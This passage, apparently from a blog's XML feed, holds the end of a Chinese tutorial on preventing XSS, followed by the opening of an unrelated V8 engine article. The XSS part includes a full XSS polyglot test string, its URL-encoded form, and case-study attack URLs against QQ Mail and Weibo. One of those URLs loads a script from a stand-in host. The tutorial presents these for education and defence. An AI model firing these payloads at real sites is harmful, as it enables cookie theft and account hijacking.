class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML 标签内文字内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&lt;%= Encode.forHtml(UNTRUSTED) %&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- HTML 标签属性值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- CSS 属性值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- CSS URL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- JavaScript 内联代码块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> msg = <span class="string">&quot;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&quot;</span>;</span></span><br><span class="line">  alert(msg);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- JavaScript 内联代码块内嵌 JSON --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> __INITIAL_STATE__ = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&lt;%= Encoder.forJavaScript(data.to_json) %&gt;&#x27;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- HTML 标签内联监听器 --&gt;</span></span><br><span class="line">&lt;button</span><br><span class="line">  onclick=&quot;alert(&#x27;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&#x27;);&quot;&gt;</span><br><span class="line">  click me</span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- URL 参数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- URL 路径 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  URL.</span></span><br><span class="line"><span class="comment">  注意：要根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&lt;%=</span></span></span><br><span class="line"><span class="tag"><span class="string">  urlValidator.isValid(UNTRUSTED) ?</span></span></span><br><span class="line"><span class="tag"><span class="string">    Encode.forHtml(UNTRUSTED) :</span></span></span><br><span class="line"><span class="tag"><span class="string">    &quot;/404&quot;</span></span></span><br><span class="line"><span class="tag"><span class="string">%&gt;&#x27;</span>&gt;</span></span><br><span class="line">  link</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。</p><h3 id="预防-DOM-型-XSS-攻击"><a href="#预防-DOM-型-XSS-攻击" class="headerlink" title="预防 DOM 型 XSS 攻击"></a>预防 DOM 型 XSS 攻击</h3><p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>如果用 Vue/React 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p><p>DOM 中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内联事件监听器中包含恶意代码 --&gt;</span></span><br><span class="line">![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/3e724ce0.data:image/png,)</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 链接内包含恶意代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;UNTRUSTED&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">// setTimeout()/setInterval() 中调用恶意代码</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;UNTRUSTED&quot;</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">setInterval</span>(<span class="string">&quot;UNTRUSTED&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">// location 调用恶意代码</span></span></span><br><span class="line"><span class="javascript">location.href = <span class="string">&#x27;UNTRUSTED&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">// eval() 中调用恶意代码</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(<span class="string">&quot;UNTRUSTED&quot;</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。</p><h2 id="其他-XSS-防范措施"><a href="#其他-XSS-防范措施" class="headerlink" title="其他 XSS 防范措施"></a>其他 XSS 防范措施</h2><p>虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。</p><h3 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content Security Policy"></a>Content Security Policy</h3><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p><ul><li>禁止加载外域代码，防止复杂的攻击逻辑。</li><li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li><li>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</li><li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</li><li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li></ul><p>关于 CSP 的详情，请关注前端安全系列后续的文章。</p><h3 id="输入内容长度控制"><a href="#输入内容长度控制" class="headerlink" title="输入内容长度控制"></a>输入内容长度控制</h3><p>对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</p><h3 id="其他安全措施"><a href="#其他安全措施" class="headerlink" title="其他安全措施"></a>其他安全措施</h3><ul><li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。</li><li>验证码：防止脚本冒充用户提交危险操作。</li></ul><h2 id="XSS-的检测"><a href="#XSS-的检测" class="headerlink" title="XSS 的检测"></a>XSS 的检测</h2><p>上述经历让小明收获颇丰，他也学会了如何去预防和修复 XSS 漏洞，在日常开发中也具备了相关的安全意识。但对于已经上线的代码，如何去检测其中有没有 XSS 漏洞呢？</p><p>经过一番搜索，小明找到了两个方法：</p><ol><li>使用通用 XSS 攻击字符串手动检测 XSS 漏洞。</li><li>使用扫描工具自动检测 XSS 漏洞。</li></ol><p>在<a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">Unleashing an Ultimate XSS Polyglot</a>一文中，小明发现了这么一个字符串：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jaVasCript:<span class="comment">/*-/*`/*\`/*&#x27;/*&quot;/**/</span>(<span class="comment">/* */</span>oNcliCk=alert() )<span class="comment">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span></span><br></pre></td></tr></table></figure><p>它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code>、<code>Function()</code>、<code>innerHTML</code>、<code>document.write()</code> 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。</p><p>小明只要在网站的各输入框中提交这个字符串，或者把它拼接到 URL 参数上，就可以进行检测了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;search?keyword&#x3D;jaVasCript%3A%2F*-%2F*%60%2F*%60%2F*%27%2F*%22%2F**%2F(%2F*%20*%2FoNcliCk%3Dalert()%20)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%3CsVg%2F%3CsVg%2FoNloAd%3Dalert()%2F%2F%3E%3E</span><br></pre></td></tr></table></figure><p>除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 <a href="https://github.com/Arachni/arachni">Arachni</a>、<a href="https://github.com/mozilla/http-observatory/">Mozilla HTTP Observatory</a>、<a href="https://github.com/andresriancho/w3af">w3af</a> 等。</p><h2 id="XSS-攻击的总结"><a href="#XSS-攻击的总结" class="headerlink" title="XSS 攻击的总结"></a>XSS 攻击的总结</h2><p>我们回到最开始提出的问题，相信同学们已经有了答案：</p><ol><li>XSS 防范是后端 RD 的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</li></ol><blockquote><p>不正确。因为： * 防范存储型和反射型 XSS 是后端 RD 的责任。而 DOM 型 XSS 攻击不发生在后端，是前端 RD 的责任。防范 XSS 是需要后端 RD 和前端 RD 共同参与的系统工程。 * 转义应该在输出 HTML 时进行，而不是在提交用户输入时。</p></blockquote><ol><li>所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</li></ol><blockquote><p>不正确。 不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 业务 RD 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。</p></blockquote><p>整体的 XSS 防范是非常复杂和繁琐的，我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。</p><p>虽然很难通过技术手段完全避免 XSS，但我们可以总结以下原则减少漏洞的产生：</p><ul><li><strong>利用模板引擎</strong> 开启模板引擎自带的 HTML 转义功能。例如： 在 ejs 中，尽量使用 <code>&lt;%= data %&gt;</code> 而不是 <code>&lt;%- data %&gt;</code>； 在 doT.js 中，尽量使用 <code>&#123;&#123;! data &#125;` 而不是 `&#123;&#123;= data &#125;`； 在 FreeMarker 中，确保引擎版本高于 2.3.24，并且选择正确的 `freemarker.core.OutputFormat`。- **避免内联事件** 尽量不要使用 `onLoad="onload('&#123;&#123;data&#125;&#125;&#39;)&quot;</code>、<code>onClick=&quot;go(&#39;&#123;&#123;action&#125;&#125;&#39;)&quot;</code> 这种拼接内联事件的写法。在 JavaScript 中通过 <code>.addEventlistener()</code> 事件绑定会更安全。</li><li><strong>避免拼接 HTML</strong> 前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 <code>createElement</code>、<code>setAttribute</code> 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。</li><li><strong>时刻保持警惕</strong> 在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。</li><li><strong>增加攻击难度，降低攻击后果</strong> 通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。</li><li><strong>主动检测和发现</strong> 可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。</li></ul><h2 id="XSS-攻击案例"><a href="#XSS-攻击案例" class="headerlink" title="XSS 攻击案例"></a>XSS 攻击案例</h2><h4 id="QQ-邮箱-m-exmail-qq-com-域名反射型-XSS-漏洞"><a href="#QQ-邮箱-m-exmail-qq-com-域名反射型-XSS-漏洞" class="headerlink" title="QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞"></a>QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞</h4><p>攻击者发现 <code>http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb</code> 这个 URL 的参数 <code>uin</code>、<code>domain</code> 未经转义直接输出到 HTML 中。</p><p>于是攻击者构建出一个 URL，并引导用户去点击： <code>http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B</code></p><p>用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">getTop().location.href=<span class="string">&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa&quot;</span>+<span class="string">&quot;&amp;t=&quot;</span>+<span class="string">&quot;&amp;d=bbbb&quot;</span>;<span class="keyword">return</span> <span class="literal">false</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;+&quot;...</span><br></pre></td></tr></table></figure><p>浏览器接收到响应后就会执行 <code>alert(document.cookie)</code>，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。</p><h4 id="新浪微博名人堂反射型-XSS-漏洞"><a href="#新浪微博名人堂反射型-XSS-漏洞" class="headerlink" title="新浪微博名人堂反射型 XSS 漏洞"></a>新浪微博名人堂反射型 XSS 漏洞</h4><p>攻击者发现 <code>http://weibo.com/pub/star/g/xyyyd</code> 这个 URL 的内容未经过滤直接输出到 HTML 中。</p><p>于是攻击者构建出一个 URL，然后诱导用户去点击：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;weibo.com&#x2F;pub&#x2F;star&#x2F;g&#x2F;xyyyd&quot;&gt;&lt;script src&#x3D;&#x2F;&#x2F;xxxx.cn&#x2F;image&#x2F;t.js&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://weibo.com/pub/star/g/xyyyd&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//xxxx.cn/image/t.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;按分类检索<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>浏览器接收到响应后就会加载执行恶意脚本 <code>//xxxx.cn/image/t.js</code>，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。</p><h2 id="扩展阅读：Automatic-Context-Aware-Escaping"><a href="#扩展阅读：Automatic-Context-Aware-Escaping" class="headerlink" title="扩展阅读：Automatic Context-Aware Escaping"></a>扩展阅读：Automatic Context-Aware Escaping</h2><p>上文我们说到：</p><ol><li>合适的 HTML 转义可以有效避免 XSS 漏洞。</li><li>完善的转义库需要针对上下文制定多种规则，例如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等等。</li><li>业务 RD 需要根据每个插入点所处的上下文，选取不同的转义规则。</li></ol><p>通常，转义库是不能判断插入点上下文的（Not Context-Aware），实施转义规则的责任就落到了业务 RD 身上，需要每个业务 RD 都充分理解 XSS 的各种情况，并且需要保证每一个插入点使用了正确的转义规则。</p><p>这种机制工作量大，全靠人工保证，很容易造成 XSS 漏洞，安全人员也很难发现隐患。</p><p>2009年，Google 提出了一个概念叫做：<a href="https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html">Automatic Context-Aware Escaping</a>。</p><p>所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。</p><p>在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;.title&#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123;.url&#125;&#125;&quot;</span>&gt;</span>&#123;&#123;.content&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;.title | htmlescaper&#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123;.url | urlescaper | attrescaper&#125;&#125;&quot;</span>&gt;</span>&#123;&#123;.content | htmlescaper&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://tech.meituan.com/2018/09/27/fe-security.html">前端安全系列（一）：如何防止XSS攻击？</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>认识 V8 引擎</title>
    <link href="http://aiolimp.com/2021/08/11/%E8%AE%A4%E8%AF%86V8%E5%BC%95%E6%93%8E/"/>
    <id>http://aiolimp.com/2021/08/11/%E8%AE%A4%E8%AF%86V8%E5%BC%95%E6%93%8E/</id>
    <published>2021-08-11T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.216Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="认识-V8-引擎"><a href="#认识-V8-引擎" class="headerlink" title="认识 V8 引擎"></a>认识 V8 引擎</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JavaScript绝对是最火的编程语言之一，一直具有很大的用户群，随着在服务端的使用（NodeJs），更是爆发了极强的生命力。编程语言分为编译型语言和解释型语言两类，编译型语言在执行之前要先进行完全编译，而解释型语言一边编译一边执行，很明显解释型语言的执行速度是慢于编译型语言的，而JavaScript就是一种解释型脚本语言，支持动态类型、弱类型、基于原型的语言，内置支持类型。鉴于JavaScript都是在前端执行，而且需要及时响应用户，这就要求JavaScript可以快速的解析及执行。</p><p>随着Web相关技术的发展，JavaScript所要承担的工作也越来越多，早就超越了“表单验证”的范畴，这就更需要快速的解析和执行JavaScript脚本。V8引擎就是为解决这一问题而生，在node中也是采用该引擎来解析JavaScript。</p><p>V8是如何使得JavaScript性能有大幅提升的呢？通过对一些书籍和文章的学习，梳理了V8的相关内容，本文将带你认识 V8。(该文在 17 年初发布于公司内网，反响不错，近来闲暇再次整理作为知乎的第一篇分享，希望帮助更多的人了解 V8 引擎。<strong>转载需经过本人同意</strong>)</p><h2 id="1-渲染引擎及网页渲染"><a href="#1-渲染引擎及网页渲染" class="headerlink" title="1.渲染引擎及网页渲染"></a>1.渲染引擎及网页渲染</h2><p>浏览器自从上世纪80年代后期90年代初期诞生以来，已经得到了长足的发展，其功能也越来越丰富，包括网络、资源管理、网页浏览、多页面管理、插件和扩展、书签管理、历史记录管理、设置管理、下载管理、账户和同步、安全机制、隐私管理、外观主题、开发者工具等。在这些功能中，为用户提供网页浏览服务无疑是最重要的功能，下面将对相关内容进行介绍。</p><h2 id="1-1-渲染引擎"><a href="#1-1-渲染引擎" class="headerlink" title="1.1.渲染引擎"></a>1.1.渲染引擎</h2><p>渲染引擎：能够将HTML/CSS/JavaScript文本及相应的资源文件转换成图像结果。渲染引擎的主要作用是将资源文件转化为用户可见的结果。在浏览器的发展过程中，不同的厂商开发了不同的渲染引擎，如Tridend(IE)、Gecko(FF)、WebKit(Safari,Chrome,Andriod浏览器)等。WebKit是由苹果2005年发起的一个开源项目，引起了众多公司的重视，几年间被很多公司所采用，在移动端更占据了垄断地位。更有甚者，开发出了基于WebKit的支持HTML5的web操作系统(如：Chrome OS、Web OS)。</p><p>下面是WebKit的大致结构：</p><p><img src="https://pic1.zhimg.com/80/v2-959135939fe2cbc2d9a437ef81dff328_720w.png" alt="img"></p><p>上图中实线框内模块是所有移植的共有部分，虚线框内不同的厂商可以自己实现。下面进行介绍：</p><ul><li>操作系统：是管理和控制计算机硬件与软件资源的计算机程序，是直接运行在“裸机”上的最基本的系统软件，任何其他软件都必须在操作系统的支持下才能运行。WebKit也是在操作系统上工作的。</li><li>第三方库，为了WebKit提供支持，如图形库、网络库、视频库等。</li><li>WebCore 是各个浏览器使用的共享部分，包括HTML解析器、CSS解析器、DOM和SVG等。JavaScriptCore是WebKit的默认引擎，在谷歌系列产品中被替换为V8引擎。WebKit Ports是WebKit中的非共享部分，由于平台差异、第三方库和需求的不同等原因，不同的移植导致了WebKit不同版本行为不一致，它是不同浏览器性能和功能差异的关键部分。</li><li>WebKit嵌入式编程接口，供浏览器调用，与移植密切相关，不同的移植有不同的接口规范。</li><li>测试用例，包括布局测试用例和性能测试用例，用来验证渲染结果的正确性。</li></ul><h2 id="1-2-网页渲染流程"><a href="#1-2-网页渲染流程" class="headerlink" title="1.2.网页渲染流程"></a>1.2.网页渲染流程</h2><p>上面介绍了渲染引擎的各个模块，那么一张网页，要经历怎样的过程，才能抵达用户面前？</p><p><img src="https://pic4.zhimg.com/80/v2-ad0a86d3faf223164a9bd22658feadc3_720w.png" alt="img"></p><p>首先是网页内容，输入到HTML解析器，HTML解析器解析，然后构建DOM树，在这期间如果遇到JavaScript代码则交给JavaScript引擎处理；如果来自CSS解析器的样式信息，构建一个内部绘图模型。该模型由布局模块计算模型内部各个元素的位置和大小信息，最后由绘图模块完成从该模型到图像的绘制。在网页渲染的过程中，大致可分为下面3个阶段。</p><h2 id="1-2-1-从输入URL到生成DOM树"><a href="#1-2-1-从输入URL到生成DOM树" class="headerlink" title="1.2.1.从输入URL到生成DOM树"></a>1.2.1.从输入URL到生成DOM树</h2><ol><li>地址栏输入URL，WebKit调用资源加载器加载相应资源；</li><li>加载器依赖网络模块建立连接，发送请求并接收答复；</li><li>WebKit接收各种网页或者资源数据，其中某些资源可能同步或异步获取；</li><li>网页交给HTML解析器转变为词语；</li><li>解释器根据词语构建节点，形成DOM树；</li><li>如果节点是JavaScript代码，调用JavaScript引擎解释并执行；</li><li>JavaScript代码可能会修改DOM树结构；</li><li>如果节点依赖其他资源，如图片\css、视频等，调用资源加载器加载它们，但这些是异步加载的，不会阻碍当前DOM树继续创建；如果是JavaScript资源URL（没有标记异步方式），则需要停止当前DOM树创建，直到JavaScript加载并被JavaScript引擎执行后才继续DOM树的创建。</li></ol><h2 id="1-2-2-从DOM树到构建WebKit绘图上下文"><a href="#1-2-2-从DOM树到构建WebKit绘图上下文" class="headerlink" title="1.2.2.从DOM树到构建WebKit绘图上下文"></a>1.2.2.从DOM树到构建WebKit绘图上下文</h2><ol><li>CSS文件被CSS解释器解释成内部表示；</li><li>CSS解释器完成工作后，在DOM树上附加样式信息，生成RenderObject树；</li><li>RenderObject节点在创建的同时，WebKit会根据网页层次结构构建RenderLayer树，同时构建一个虚拟绘图上下文。</li></ol><h2 id="1-2-3-绘图上下文到最终图像呈现"><a href="#1-2-3-绘图上下文到最终图像呈现" class="headerlink" title="1.2.3.绘图上下文到最终图像呈现"></a>1.2.3.绘图上下文到最终图像呈现</h2><ol><li>绘图上下文是一个与平台无关的抽象类，它将每个绘图操作桥接到不同的具体实现类，也就是绘图具体实现类；</li><li>绘图实现类也可能有简单的实现，也可能有复杂的实现，软件渲染、硬件渲染、合成渲染等；</li><li>绘图实现类将2D图形库或者3D图形库绘制结果保存，交给浏览器界面进行展示。</li></ol><p>上述是一个完整的渲染过程，现代网页很多都是动态的，随着网页与用户的交互，浏览器需要不断的重复渲染过程。</p><h2 id="1-3-JavaScript引擎"><a href="#1-3-JavaScript引擎" class="headerlink" 